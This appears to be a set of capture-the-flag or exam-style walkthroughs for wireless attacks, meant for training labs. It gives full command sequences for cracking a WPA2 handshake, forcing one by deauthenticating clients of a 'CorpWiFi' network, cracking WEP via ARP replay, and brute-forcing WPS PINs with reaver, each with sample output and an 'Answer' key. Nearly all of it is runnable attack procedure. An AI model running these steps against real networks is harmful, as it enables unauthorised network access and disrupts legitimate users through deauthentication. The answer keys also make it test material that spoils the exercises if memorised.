# 14 Wireless — full walkthroughs

---

## Walkthrough 1: "Crack the WPA2 handshake in capture.cap — wordlist rockyou.txt"

**Type:** offline crack | **Difficulty:** easy | **Time:** 2–15 min (depends on key)

1. Verify the cap actually has a handshake:
   ```bash
   aircrack-ng capture.cap
   ```
   Look for `1 handshake` next to the BSSID.
2. Crack:
   ```bash
   aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap
   ```
3. Output:
   ```
   KEY FOUND! [ password123 ]
   ```
4. **Answer:** `password123`

**Gotcha:** if rockyou isn't extracted → `sudo gunzip /usr/share/wordlists/rockyou.txt.gz`.

---

## Walkthrough 2: "Capture a WPA2 handshake from SSID `CorpWiFi` and crack it"

1. Monitor mode:
   ```bash
   sudo airmon-ng check kill
   sudo airmon-ng start wlan0
   ```
2. Find the AP:
   ```bash
   sudo airodump-ng wlan0mon
   ```
   Note BSSID `AA:BB:CC:DD:EE:FF` on channel `6`.
3. Lock capture:
   ```bash
   sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w corp wlan0mon
   ```
4. In a second terminal, force a handshake:
   ```bash
   sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon
   ```
5. Watch airodump top bar for `WPA handshake: AA:BB:CC:DD:EE:FF`.
6. Crack:
   ```bash
   aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF corp-01.cap
   ```
7. **Answer:** whatever KEY FOUND shows.

---

## Walkthrough 3: "Crack the WEP key on `OldRouter`"

1. Monitor mode → airodump → note BSSID + channel.
2. Lock capture:
   ```bash
   sudo airodump-ng -c 3 --bssid <BSSID> -w wep wlan0mon
   ```
3. Fake auth + ARP replay to generate IVs fast:
   ```bash
   sudo aireplay-ng -1 0 -a <BSSID> wlan0mon
   sudo aireplay-ng -3 -b <BSSID> wlan0mon
   ```
4. Once `#Data` column hits ~20k, in another terminal:
   ```bash
   aircrack-ng wep-01.cap
   ```
5. **Answer:** the ASCII/hex key (e.g. `1234567890`).

---

## Walkthrough 4: "Find WPS-enabled AP and recover the PIN"

1. Monitor mode.
2. Hunt for WPS:
   ```bash
   sudo wash -i wlan0mon
   ```
   Output:
   ```
   BSSID              Ch  WPS  Lck  Vendor     ESSID
   AA:BB:CC:DD:EE:FF  6   2.0  No   Realtek    HomeAP
   ```
3. Pixie Dust attempt first (fast):
   ```bash
   sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vv
   ```
4. If Pixie fails, full PIN brute:
   ```bash
   sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
   ```
5. Final output:
   ```
   [+] WPS PIN: '12345670'
   [+] WPA PSK: 'hunter2hunter2'
   ```
6. **Answer:** PIN `12345670`, PSK `hunter2hunter2`.
